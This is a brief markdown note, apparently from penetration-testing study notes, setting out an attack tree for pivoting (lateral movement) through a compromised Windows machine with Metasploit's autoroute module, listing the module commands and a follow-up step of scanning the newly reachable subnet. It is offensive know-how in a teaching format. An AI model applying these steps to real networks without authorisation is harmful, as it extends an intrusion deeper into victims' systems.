# Pivoting using Meterpreter Autoroute

## Attack tree

```text
1 Set up a route between hacked computer and Kali machine
    1.1 In current session use ipconfig to find IP adresses of the hacked machine and pick a subnet not visible to the hacking machine (AND)
    1.2 Background the current basic shell (AND)
    1.3 > use post/windows/manage/autoroute (AND)
    1.4 > set subnet [subnet] (change last number in IP address to 0) (AND)
    1.5 > set session [id]  (the id of the basic shell just put in the background) (AND)
    1.6 > exploit
2 Enumerate network on a hacked machine in the other network (port scanning, sniffing, ...)
```

## Notes

Pivoting is the act of moving from host to host through compromise. It is also known as lateral movement. 